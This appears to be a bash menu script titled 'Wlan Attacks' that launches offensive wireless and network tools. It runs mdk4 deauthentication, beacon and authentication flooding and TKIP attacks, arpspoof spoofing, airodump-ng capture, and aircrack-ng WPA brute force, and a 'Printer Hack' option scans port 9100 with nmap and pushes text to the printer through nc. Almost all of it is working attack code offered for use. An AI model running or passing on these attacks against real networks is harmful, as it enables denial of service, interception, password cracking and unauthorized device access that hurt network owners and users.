cyan='\e[0;36m' 
green='\033[92m' 
red='\e[1;31m' 
yel='\e[0;33m' 
orange='\e[38;5;166m'

figlet "Wlan"
figlet "Attacks"
figlet "Menu"

echo -e $green"========================"
echo -e $red"1)Deauth Attack"
echo -e $red"2)Beacon DDoS"
echo -e $red"3)Auth DDoS"
echo -e $red"4)TKIP"
echo -e $red"5)Spoof"
echo -e $red"6)Passive Attack"
echo -e $red"7)Brute Force WPA"
echo -e $red"8)Put Interface In Monitor Mode"
echo -e $red"9)Explore For Targets"
echo -e $red"10)Printer Hack"
echo -e $green"========================"

read -p " [<Attacks>] " attacks 
if [ $attacks = "1" ] 
then 
clear
figlet "Deauth"
read -p " [>Interface<] " inter1
echo -e $green"[+] Starting..."
sudo mdk4 $inter1 d 
fi 

if [ $attacks = "2" ] 
then
clear
figlet "Beacon DDoS"
read -p " [>Interface<] " inter2 
echo -e $green"[+] Starting..."
sudo mdk4 $inter2 b
fi

if [ $attacks = "3" ] 
then
clear
figlet "Auth DDoS"
read -p " [>Interface<] " inter3 
echo -e $green"[+] Starting..."
sudo mdk4 $inter3 a 
fi

if [ $attacks = "4" ]
then
clear
figlet "TKIP"
read -p " [>Interface<] " inter4
read -p " [>Target<] " ap1
echo -e $green"[+] Starting..."
sudo mdk4 $inter4 m -t ap1
fi

if [ $attacks = "5" ] 
then
clear
figlet "Spoof"
read -p " [>Interface<] " inter5
echo -e $green"[+] Starting..."
arpspoof $inter5 
fi

if [ $attacks = "6" ]
then
clear
figlet "Passive"
figlet "Attack"
read -p " [>Interface<] " inter6
echo -e $green"[+] Starting..." 
sudo airodump-ng -w data $inter6 
fi

if [ $attacks = "7" ]
then
clear
figlet "WPA"
figlet "Brute" 
read -p " [>Target-BSSID<] " bssid1 
read -p " [>Wordlist<] " word1
echo -e $green"[+] Starting..."
sudo aircrack-ng -w $word1 -b $bssid1 /$HOME/NobodysLand/data-01.cap
fi

if [ $attacks = "8" ] 
then
clear
figlet "Mon0" 
read -p " [>Interface<] " inter8 
echo -e $green"[+] Starting..." 
sudo airmon-ng start $inter8 
fi

if [ $attacks = "9" ] 
then
clear
figlet "Explore"
read -p " [>Interface<] " inter9
echo -e $green"[+] Starting..."
sudo airodump-ng $inter9 
fi

#Printer Hack

if [ $attacks = "10" ]
then
clear
sleep 2

figlet "Printer Hack" |lolcat
sleep 2

read -p " [>Target<] " printer1
echo "Hacked" | nc $(nmap -T 5 -p 9100 $printer1 --open | grep 'report' | cut -d ' ' -f5) 9100

fi

